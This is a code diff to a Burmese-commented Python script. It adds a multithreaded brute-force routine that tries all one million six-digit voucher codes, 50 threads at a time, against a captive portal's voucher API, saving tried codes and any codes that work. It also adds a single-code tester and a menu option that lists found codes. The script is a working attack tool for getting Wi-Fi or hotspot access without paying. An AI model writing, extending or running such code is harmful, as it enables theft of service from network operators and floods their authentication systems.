@@ -3,6 +3,7 @@ import re
 import urllib3
 import time
 import threading
+import random
 from datetime import datetime, timedelta
 import sys
 import os
@@ -16,13 +17,24 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 KEYS_URL = "https://raw.githubusercontent.com/winhtetaung1662004-byte/win/main/keys.txt"
 TRIED_CODES_FILE = "tried_codes.txt"
 SUCCESS_CODES_FILE = "success.txt"
-CODE_TO_TEST = "536884" # --- စစ်ဆေးမည့် Code ---
+CODE_TO_TEST = "536884" 
+VOUCHER_THREADS = 50 
 
 # --- CLEAR SCREEN FUNCTION ---
 def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
 
 # --- CACHE MANAGEMENT ---
+def load_tried_codes():
+    if not os.path.exists(TRIED_CODES_FILE):
+        return set()
+    with open(TRIED_CODES_FILE, "r") as f:
+        return set(line.strip() for line in f)
+
+def save_tried_code(code):
+    with open(TRIED_CODES_FILE, "a") as f:
+        f.write(f"{code}\n")
+
 def save_success_code(code):
     with open(SUCCESS_CODES_FILE, "a") as f:
         f.write(f"{code}\n")
@@ -88,11 +100,65 @@ def show_menu():
     choice = input("👉 ရွေးချယ်ပါ (1-3): ")
     return choice
 
+# --- FAST RANDOM VOUCHER HARVESTING LOGIC ---
+def test_code(code, portal_host, sid, session):
+    """တစ်ခုချင်းစီကို Thread နဲ့စမ်းသပ်သည့် function"""
+    voucher_api = f"{portal_host}/api/auth/voucher/"
+    try:
+        # --- API CALL စမ်းသပ်သည့်နေရာ ---
+        v_res = session.post(voucher_api, json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, timeout=5)
+        
+        if v_res.status_code == 200 and "success" in v_res.text.lower():
+            # SUCCESS အစိမ်းရောင်တန်းကျလာမည်
+            print(f"\n\033[92m✅ SUCCESS! Found Code: {code}\033[0m")
+            save_tried_code(code)
+            save_success_code(code)
+            return True
+    except:
+        pass
+    
+    save_tried_code(code)
+    # Fail ဖြစ်ပါက ဘာမှမပြဘဲနေမည် (Silent)
+    return False
+
+def start_voucher_harvesting():
+    print(f"\n🔍 Voucher Code ရှာဖွေခြင်း အရှိန်မြှင့် စတင်ပြီ...")
+    tried_codes = load_tried_codes()
+    print(f"📚 စမ်းသပ်ပြီးသား Code {len(tried_codes)} ခု ကျော်လွှားမည်။")
+
+    # Example placeholders
+    portal_host = "http://192.168.60.1" 
+    sid = "example_session_id"
+    session = requests.Session()
+
+    threads = []
+    
+    # 000000 ကနေ 999999 ထိ Random ယူမည်
+    all_codes = list(range(1000000))
+    random.shuffle(all_codes) # --- RANDOM လုပ်ခြင်း ---
+
+    for code_int in all_codes:
+        code = f"{code_int:06d}"
+        if code in tried_codes:
+            continue
+        
+        # Thread အများကြီးနဲ့ စမ်းသပ်ခြင်း
+        t = threading.Thread(target=test_code, args=(code, portal_host, sid, session))
+        threads.append(t)
+        t.start()
+        
+        # Threads အရေအတွက် ထိန်းချုပ်ခြင်း
+        if len(threads) >= VOUCHER_THREADS:
+            for t in threads:
+                t.join()
+            threads = []
+            
+        print(f"\r🔍 Random စမ်းသပ်နေသည်: {code}", end="", flush=True)
+
 # --- SPECIFIC CODE TESTER ---
 def test_specific_code():
     print(f"\n🔍 စမ်းသပ်နေသည်: {CODE_TO_TEST} ...")
     
-    # Example placeholders - !! Portal အစစ်မှ ယူရမည် !!
     portal_host = "http://192.168.60.1" 
     sid = "example_session_id"
     session = requests.Session()
@@ -100,11 +166,9 @@ def test_specific_code():
     voucher_api = f"{portal_host}/api/auth/voucher/"
     
     try:
-        # --- API CALL စမ်းသပ်ခြင်း ---
         v_res = session.post(voucher_api, json={'accessCode': CODE_TO_TEST, 'sessionId': sid, 'apiVersion': 1}, timeout=5)
         
         if v_res.status_code == 200 and "success" in v_res.text.lower():
-            # SUCCESS အစိမ်းရောင်
             print(f"\n\033[92m✅ SUCCESS! Valid Code Found: {CODE_TO_TEST}\033[0m")
             save_success_code(CODE_TO_TEST)
         else:
@@ -123,5 +187,14 @@ if __name__ == "__main__":
             print("\n🌐 Internet Access... (Logic implementation needed)")
         elif choice == '2':
             test_specific_code()
-        elif choice == '
-        
+        elif choice == '3':
+            print("\n📋 Success Code များ:")
+            if os.path.exists(SUCCESS_CODES_FILE):
+                with open(SUCCESS_CODES_FILE, "r") as f:
+                    print(f.read())
+            else:
+                print("No success codes found.")
+            time.sleep(5)
+        else:
+            print("🚫 မှားယွင်းသော ရွေးချယ်မှု။")
+            
